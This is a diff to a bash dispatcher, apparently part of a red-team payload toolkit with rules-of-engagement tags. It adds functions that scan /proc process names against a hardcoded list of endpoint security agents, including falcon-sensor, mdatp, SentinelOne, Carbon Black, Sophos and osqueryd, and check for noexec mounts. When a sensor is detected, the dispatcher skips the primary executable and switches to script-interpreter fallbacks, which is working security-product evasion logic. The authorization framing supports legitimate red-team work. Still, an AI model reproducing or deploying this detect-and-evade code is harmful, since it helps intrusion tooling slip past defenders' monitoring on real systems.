@@ -81,6 +81,64 @@ if [[ "$authorized_arg" == false ]]; then
 fi
 export STEALTHY_AUTHORIZED=1
 
+# True when /proc/self/mounts lists noexec on the longest prefix of $1.
+mount_has_noexec() {
+  local target="$1"
+  local resolved=""
+  if [[ -d "$target" ]]; then
+    resolved="$(cd "$target" && pwd)" || return 1
+  elif [[ -e "$target" ]]; then
+    resolved="$(cd "$(dirname "$target")" && pwd)/$(basename "$target")" || return 1
+  else
+    return 1
+  fi
+  local mp opts best_opts="" best_len=-1
+  while read -r _ mp _ opts _; do
+    mp="${mp//\\040/ }"
+    case "$resolved" in
+      "$mp"|"$mp"/*)
+        if [[ ${#mp} -gt $best_len ]]; then
+          best_len=${#mp}
+          best_opts="$opts"
+        fi
+        ;;
+    esac
+  done < /proc/self/mounts || true
+  [[ "$best_opts" == *noexec* ]]
+}
+
+# Prints a short reason and returns 0 when a live endpoint sensor or noexec
+# drop mount is observed. Process comm names only; no ps/systemctl.
+detect_linux_sensor() {
+  local path comm
+  for path in /proc/[0-9]*/comm; do
+    [[ -r "$path" ]] || continue
+    comm=""
+    IFS= read -r comm < "$path" || true
+    comm="${comm%$'\r'}"
+    case "$comm" in
+      falcon-sensor|mdatp|wdavdaemon|elastic-agent|sentinelone-agent|s1-agent|cbagentd|cbdaemon|RepMgr|mfetpd|SophosHealth|savscand|symcfgd|rtvscand|tmdagent|ds_agent|kesl|ens|utl|bdagentd|cortex-xdr|traps_paned|cylancesvc|osqueryd|qualys-cloud-agent|tvmagent|ir_agent|taniumclient|fapolicyd)
+        printf 'comm=%s' "$comm"
+        return 0
+        ;;
+    esac
+  done
+  if mount_has_noexec "$1"; then
+    printf 'mount-noexec'
+    return 0
+  fi
+  return 1
+}
+
+fallback_banner() {
+  local label="$1"
+  case "${dispatch_reason:-blocked}" in
+    script-only) echo "dispatcher: script-only bundle; trying approved $label fallback" >&2 ;;
+    script-first) echo "dispatcher: script-first; trying approved $label fallback" >&2 ;;
+    *) echo "dispatcher: primary executable blocked; trying approved $label fallback" >&2 ;;
+  esac
+}
+
 # Empty drop_dir (staged default) -> run the ELF in place, matching Windows.
 # Avoids a second write+exec from $bundle_dir/.run-cache.
 drop_dir_raw="${cfg[drop_dir]:-}"
@@ -107,7 +165,36 @@ else
     primary="$drop_dir/$primary_name"
   fi
 fi
-if [[ "$use_in_place" != true && -n "$primary_src" && -f "$primary_src" && "$primary_src" != "$primary" ]]; then
+script_first="${STEALTHY_SCRIPT_FIRST:-${cfg[script_first]:-auto}}"
+script_first="${script_first#"${script_first%%[![:space:]]*}"}"
+script_first="${script_first%"${script_first##*[![:space:]]}"}"
+case "$script_first" in
+  auto|true|false) ;;
+  *) echo "dispatcher: unsupported script_first value" >&2; exit 78 ;;
+esac
+
+skip_primary=false
+skip_reason=""
+dispatch_reason="blocked"
+if [[ "$bundle_mode" == "script-only" ]]; then
+  skip_primary=true
+  dispatch_reason="script-only"
+elif [[ "$script_first" == "true" ]]; then
+  skip_primary=true
+  skip_reason="script-first=true"
+  dispatch_reason="script-first"
+elif [[ "$script_first" == "auto" ]]; then
+  if skip_reason="$(detect_linux_sensor "$drop_dir")"; then
+    skip_primary=true
+    dispatch_reason="script-first"
+  fi
+fi
+if [[ "$skip_primary" == true && "$bundle_mode" != "script-only" ]]; then
+  echo "dispatcher: skipping primary ($skip_reason); using approved script hosts" >&2
+  primary=""
+fi
+
+if [[ "$skip_primary" != true && "$use_in_place" != true && -n "$primary_src" && -f "$primary_src" && "$primary_src" != "$primary" ]]; then
   set +e
   install -m 0750 "$primary_src" "$primary"
   copy_status=$?
@@ -144,6 +231,10 @@ export STEALTHY_MANIFEST_ROE_REF="${STEALTHY_ROE_REF:-${cfg[roe_ref]}}"
 export STEALTHY_EXECUTION_PATH="binary"
 if [[ "$bundle_mode" == "script-only" ]]; then
   export STEALTHY_PRIMARY_LAUNCH="not_applicable"
+elif [[ "$skip_primary" == true && "$script_first" == "true" ]]; then
+  export STEALTHY_PRIMARY_LAUNCH="skipped-script-first"
+elif [[ "$skip_primary" == true ]]; then
+  export STEALTHY_PRIMARY_LAUNCH="skipped-sensor"
 else
   export STEALTHY_PRIMARY_LAUNCH="ok"
 fi
@@ -204,15 +295,11 @@ try_fallback() {
   export STEALTHY_EXECUTION_PATH="${label}-fallback"
   if [[ "$bundle_mode" == "script-only" ]]; then
     export STEALTHY_PRIMARY_LAUNCH="not_applicable"
-  else
+  elif [[ "${STEALTHY_PRIMARY_LAUNCH:-}" != "skipped-sensor" && "${STEALTHY_PRIMARY_LAUNCH:-}" != "skipped-script-first" ]]; then
     export STEALTHY_PRIMARY_LAUNCH="blocked"
   fi
   export STEALTHY_MANIFEST_ROE_REF="${STEALTHY_ROE_REF:-${cfg[roe_ref]}}"
-  if [[ "$bundle_mode" == "script-only" ]]; then
-    echo "dispatcher: script-only bundle; trying approved $label fallback" >&2
-  else
-    echo "dispatcher: primary executable blocked; trying approved $label fallback" >&2
-  fi
+  fallback_banner "$label"
 
   local -a cmd=("$interpreter" "$script" --authorized)
   if [[ "$is_json" == true ]]; then
